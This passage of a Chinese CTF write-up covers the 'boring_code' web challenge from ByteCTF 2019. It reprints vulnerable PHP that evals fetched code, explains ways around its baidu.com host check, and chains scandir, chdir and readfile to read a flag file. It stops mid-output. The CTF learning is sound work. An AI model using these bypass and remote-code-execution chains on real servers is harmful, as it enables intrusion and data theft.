<!DOCTYPE html><html class="has-navbar-fixed-top" lang="zh-cmn-Hans"><head><meta charset="utf-8"><title>ByteCTF 2019 Web WP - Zedd&#39;s Blog</title><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=5"><meta name="description" content="ZeddYu's Blog"><meta name="description" content="周末自己打了一会 Byte CTF ，队里其他师傅都没啥时间，自己做题比较慢，就只做了几个题。"><meta property="og:type" content="article"><meta property="og:title" content="ByteCTF 2019 Web WP"><meta property="og:url" content="https://blog.zeddyu.info/2019/09/17/bytectf2019/index.html"><meta property="og:site_name" content="Zedd&#39;s Blog"><meta property="og:description" content="周末自己打了一会 Byte CTF ，队里其他师傅都没啥时间，自己做题比较慢，就只做了几个题。"><meta property="og:locale" content="en_US"><meta property="og:image" content="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg=="><meta property="article:published_time" content="2019-09-17T10:11:20.000Z"><meta property="article:modified_time" content="2021-09-27T17:45:58.724Z"><meta property="article:author" content="Zedd"><meta property="article:tag" content="CTF"><meta property="article:tag" content="sql注入"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg=="><link rel="icon" href="/favicon.png"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bulma/0.8.1/css/bulma.min.css"><script defer="defer" src="https://at.alicdn.com/t/font_1780077_0ad2sbnz4nz.js"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/styles/atom-one-light.min.css"><link rel="stylesheet" href="/css/style.css"><script>window.ga_tid="UA-112937997-1",window.ga_api="https://blog.zeddyu.info/ga_api/*"</script><script src="https://cdn.jsdelivr.net/npm/cfga@1.0.3" async></script><meta name="generator" content="Hexo 4.2.1"><link rel="alternate" href="/atom.xml" title="Zedd's Blog" type="application/atom+xml"></head><body><nav class="navbar is-transparent is-fixed-top navbar-main" role="navigation" aria-label="main navigation"><div class="container"><div class="navbar-brand"><div class="navbar-item navbar-logo"> <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://s.gravatar.com/avatar/204a0c779acdb62f9084826396f6dccb?s=80" alt="" height="28"></div><div class="navbar-burger"><span></span><span></span><span></span></div></div><div class="navbar-menu navbar-start"> <a class="navbar-item" href="/">Index</a> <a class="navbar-item" href="/archives">Archives</a> <a class="navbar-item" href="/categories">Categories</a> <a class="navbar-item" href="/tags">Tags</a> <a class="navbar-item" href="/friends">Friends</a> <a class="navbar-item" href="/about">About</a> <a class="navbar-item" href="/advertisement">Ads</a></div><div class="navbar-menu navbar-end"> <a class="navbar-item search" title="Search" href="javascript:;"><svg class="iconfont" aria-hidden="true"><use xlink:href="#icon-sousuo"></use></svg></a><div class="navbar-item is-hoverable has-dropdown is-hidden-mobile is-hidden-tablet-only toc"> <a class="navbar-item" title="Table of Contents"><svg class="iconfont" aria-hidden="true"><use xlink:href="#icon-list"></use></svg></a><div class="navbar-dropdown is-right"> <a class="navbar-item" href="#Web">1&nbsp;&nbsp;<b>Web</b></a> <a class="navbar-item" href="#boring-code">1.1&nbsp;&nbsp;boring_code</a> <a class="navbar-item" href="#EzCMS">1.2&nbsp;&nbsp;EzCMS</a> <a class="navbar-item" href="#rss">1.3&nbsp;&nbsp;rss</a> <a class="navbar-item" href="#babyblog">1.4&nbsp;&nbsp;babyblog</a> <a class="navbar-item" href="#dot-server-prove">1.5&nbsp;&nbsp;dot_server_prove</a> <a class="navbar-item" href="#iCloudMusic">1.6&nbsp;&nbsp;iCloudMusic</a><hr class="navbar-divider"> <a class="navbar-item" href="#Conclusion">2&nbsp;&nbsp;<b>Conclusion</b></a></div></div> <a class="navbar-item" title="GitHub" href="https://github.com/ZeddYu" target="_blank" rel="noopener"><svg class="iconfont" aria-hidden="true"><use xlink:href="#icon-github"></use></svg></a> <a class="navbar-item" title="Twitter" href="https://twitter.com/ZeddYu_Lu" target="_blank" rel="noopener"><svg class="iconfont" aria-hidden="true"><use xlink:href="#icon-twitter"></use></svg></a> <a class="navbar-item" title="RSS" href="https://blog.zeddyu.info/atom.xml"><svg class="iconfont" aria-hidden="true"><use xlink:href="#icon-rss"></use></svg></a></div></div></nav><section class="section"><div class="container"><article class="article content gallery" itemscope itemprop="blogPost"><h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name"> ByteCTF 2019 Web WP</h1><div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile"> <span class="column is-narrow"><span>Sep 17 2019</span> <span class="second-date-block">(<time datetime="2019-09-17T10:11:20.000Z" itemprop="datePublished">Sep 17 2019</time>)</span></span> <span class="column is-narrow article-category"><svg class="iconfont" aria-hidden="true"><use xlink:href="#icon-folder"></use></svg><a class="article-category-link" href="/categories/CTF/">CTF</a></span> <span class="column is-narrow"><svg class="iconfont" aria-hidden="true"><use xlink:href="#icon-shalou"></use></svg> <span class="article-category-link">29 minutes read (About 4330 words)</span></span></div><div class="article-entry is-size-6-mobile" itemprop="articleBody"><ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Web"><span class="post-toc-number">1.</span> <span class="post-toc-text">Web</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#boring-code"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">boring_code</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#EzCMS"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">EzCMS</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#rss"><span class="post-toc-number">1.3.</span> <span class="post-toc-text">rss</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#babyblog"><span class="post-toc-number">1.4.</span> <span class="post-toc-text">babyblog</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#dot-server-prove"><span class="post-toc-number">1.5.</span> <span class="post-toc-text">dot_server_prove</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#iCloudMusic"><span class="post-toc-number">1.6.</span> <span class="post-toc-text">iCloudMusic</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Conclusion"><span class="post-toc-number">2.</span> <span class="post-toc-text">Conclusion</span></a></li></ol><html><head></head><body><p>周末自己打了一会 Byte CTF ，队里其他师傅都没啥时间，自己做题比较慢，就只做了几个题。</p><a id="more"></a><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="boring-code"><a href="#boring-code" class="headerlink" title="boring_code"></a>boring_code</h2><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_valid_url</span><span class="hljs-params">($url)</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">if</span> (filter_var($url, FILTER_VALIDATE_URL)) {</span><br><span class="line">        <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">'/data:\/\//i'</span>, $url)) {</span><br><span class="line">            <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'url'</span>])){</span><br><span class="line">    $url = $_POST[<span class="hljs-string">'url'</span>];</span><br><span class="line">    <span class="hljs-keyword">if</span> (is_valid_url($url)) {</span><br><span class="line">        $r = parse_url($url);</span><br><span class="line">        <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">'/baidu\.com$/'</span>, $r[<span class="hljs-string">'host'</span>])) {</span><br><span class="line">            $code = file_get_contents($url);</span><br><span class="line">            <span class="hljs-keyword">if</span> (<span class="hljs-string">';'</span> === preg_replace(<span class="hljs-string">'/[a-z]+\((?R)?\)/'</span>, <span class="hljs-keyword">NULL</span>, $code)) {</span><br><span class="line">                <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">'/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i'</span>, $code)) {</span><br><span class="line">                    <span class="hljs-keyword">echo</span> <span class="hljs-string">'bye~'</span>;</span><br><span class="line">                } <span class="hljs-keyword">else</span> {</span><br><span class="line">                    <span class="hljs-keyword">eval</span>($code);</span><br><span class="line">                }</span><br><span class="line">            }</span><br><span class="line">        } <span class="hljs-keyword">else</span> {</span><br><span class="line">            <span class="hljs-keyword">echo</span> <span class="hljs-string">"error: host not allowed"</span>;</span><br><span class="line">        }</span><br><span class="line">    } <span class="hljs-keyword">else</span> {</span><br><span class="line">        <span class="hljs-keyword">echo</span> <span class="hljs-string">"error: invalid url"</span>;</span><br><span class="line">    }</span><br><span class="line">}<span class="hljs-keyword">else</span>{</span><br><span class="line">    highlight_file(<span class="hljs-keyword">__FILE__</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>审计题，由 <a href="https://medium.com/secjuice/php-ssrf-techniques-9d422cb28d51" target="_blank" rel="noopener">PHP SSRF Techniques</a> 这篇文章我们可以知道有几种 bypass trick，与题目比较类似的是最后一种 trick ，使用 data 协议绕过进行 xss</p><p></p><figure class="highlight dts hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-symbol">data:</span><span class="hljs-comment">//google.com/plain;base64,SSBsb3ZlIFBIUAo=</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>但是我们这里 data 直接被 ban 掉了，就没办法了…</p><p>这里我们队 @rmb122 师傅是直接买了一个域名<code>xxxxbaidu.com</code>这样，然后起个 http 服务就行，然而看了 ROIS 的 wp ，还有一个比较有意思的解法，就是利用百度爬虫。</p><p>在百度搜索界面如果爬到的自己网站的话，点击自己的网站，并不是直接访问自己的网站，而是百度有一个重定向的机制，将你的网站转换成了类似如下的形式</p><p></p><figure class="highlight dts hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-symbol">http:</span><span class="hljs-comment">//www.baidu.com/link?url=7W9evem35YiIRoQTUDMHxL5ZzKqb8nlwG_me93YTuIZLKV6l0YLOZcxWlVTdNGPQ70SncapWoM5ceZ55fUae6a</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>最终还是会跳转到你的网站，但是这个要求就是需要让百度的虫子爬到自己的网站，百度爬虫一般是两三天生效，所以如果是早就有自己的站并且被百度爬虫爬了的，或者在百度站长上提交了的都可以采用这种类似的方法进行绕过。</p><p>接下来一个正则<code>/[a-z]+\((?R)?\)/</code>，就是一个无参数 RCE 了，意思就是只允许使用类似<code>a(b(c()));</code>这种形式，并且过滤了下划线，很多函数都不能用了。</p><p>再接下来一个正则<code>/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i</code>，就是一个简单的关键字过滤了，我们可以使用<code>get_definded_functions</code>来取得所有内置可用函数，再用这个正则过滤，保留最后剩下的函数，用这个函数绕过上面的正则就行了。</p><p>根据题目提示，题目的 Web 目录形式大致是</p><p></p><figure class="highlight stylus hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── code</span><br><span class="line">│&nbsp;&nbsp; └── index.php</span><br><span class="line">└── index.php</span><br><span class="line"></span><br><span class="line"><span class="hljs-number">1</span> directory, <span class="hljs-number">2</span> files</span><br></pre></td></tr></tbody></table></figure><p></p><p>我们运行的源代码是在 code 文件夹下，而 flag 是在与 code 目录平级的 index.php 文件中，意思就是我们需要获得<code>../index.php</code>的源码，我们可以构建一个类似的代码环境方便调试。</p><p>所以第一个我们比较容易想到的是用<code>scandir</code>函数拿到当前目录，得到一个数组，使用<code>chdir</code>函数跳到上级目录，再用<code>readfile</code>进行读取。</p><p>首先用<code>scandir</code>得到当前目录数组：</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">php &gt; var_dump(scandir(<span class="hljs-string">'.'</span>));</span><br><span class="line"><span class="hljs-keyword">array</span>(<span class="hljs-number">3</span>) {</span><br><span class="line">  [<span class="hljs-number">0</span>]=&gt;</span><br><span class="line">  string(<span class="hljs-number">1</span>) <span class="hljs-string">"."</span></span><br><span class="line">  [<span class="hljs-number">1</span>]=&gt;</span><br><span class="line">  string(<span class="hljs-number">2</span>) <span class="hljs-string">".."</span></span><br><span class="line">  [<span class="hljs-number">2</span>]=&gt;</span><br><span class="line">  string(<span class="hljs-number">8</span>) <span class="hljs-string">"test.php"</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>可以看到<code>..</code>是在第二个，也就是数组的 array[1] 位置，于是我们可以使用<code>next</code>函数获得数组第二个字符串。</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php &gt; var_dump(next(scandir(<span class="hljs-string">'.'</span>)));</span><br><span class="line">PHP Notice:  Only variables should be passed by reference in php shell code on line <span class="hljs-number">1</span></span><br><span class="line">string(<span class="hljs-number">2</span>) <span class="hljs-string">".."</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>接着用<code>chdir</code>函数跳到上级目录：</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php &gt; var_dump(chdir(next(scandir(<span class="hljs-string">'.'</span>))));</span><br><span class="line">PHP Notice:  Only variables should be passed by reference in php shell code on line <span class="hljs-number">1</span></span><br><span class="line">bool(<span class="hljs-keyword">true</span>)</span><br></pre></td></tr></tbody></table></figure><p></p><p>虽然有一个 PHP Notice ，但是也误伤大雅，这里关键的是<code>chdir</code>返回值是个<code>bool(true)</code>，并没有返回上级目录数组什么的，这样我们貌似就不能获取到上级目录下的文件了，也就不能拿到源码了。</p><p>我们暂时先抛开这个问题，先假设到了上级目录，那我们是不是也可以像上面的方法一样，用<code>sandir</code>获得数组来进一步读取文件呢？</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">php &gt; var_dump(scandir(<span class="hljs-string">'.'</span>));</span><br><span class="line"><span class="hljs-keyword">array</span>(<span class="hljs-number">4</span>) {</span><br><span class="line">  [<span class="hljs-number">0</span>]=&gt;</span><br><span class="line">  string(<span class="hljs-number">1</span>) <span class="hljs-string">"."</span></span><br><span class="line">  [<span class="hljs-number">1</span>]=&gt;</span><br><span class="line">  string(<span class="hljs-number">2</span>) <span class="hljs-string">".."</span></span><br><span class="line">  [<span class="hljs-number">2</span>]=&gt;</span><br><span class="line">  string(<span class="hljs-number">4</span>) <span class="hljs-string">"code"</span></span><br><span class="line">  [<span class="hljs-number">3</span>]=&gt;</span><br><span class="line">  string(<span class="hljs-number">9</span>) <span class="hljs-string">"index.php"</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>这样我们就可以看到我们的目标文件了，因为目录排序的原因， i 在 c 的后面，所以我们肯定可以直接用<code>end</code>函数直接获取这个数组的最后一个拿到<code>index.php</code>字符串，</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php &gt; var_dump(end(scandir(<span class="hljs-string">'.'</span>)));</span><br><span class="line">PHP Notice:  Only variables should be passed by reference in php shell code on line <span class="hljs-number">1</span></span><br><span class="line">string(<span class="hljs-number">9</span>) <span class="hljs-string">"index.php"</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>接着我们就可以愉快的用<code>readfile</code>来获取 flag 了</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php &gt; var_dump(readfile(end(scandir(<span class="hljs-string">'.'</span>))));</span><br><span class="line">PHP Notice:  Only variables should be passed by reference in php shell code on line <span class="hljs-number">1</span></span><br><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line">$flag = <span class="hljs-string">"This is index.php! And you get 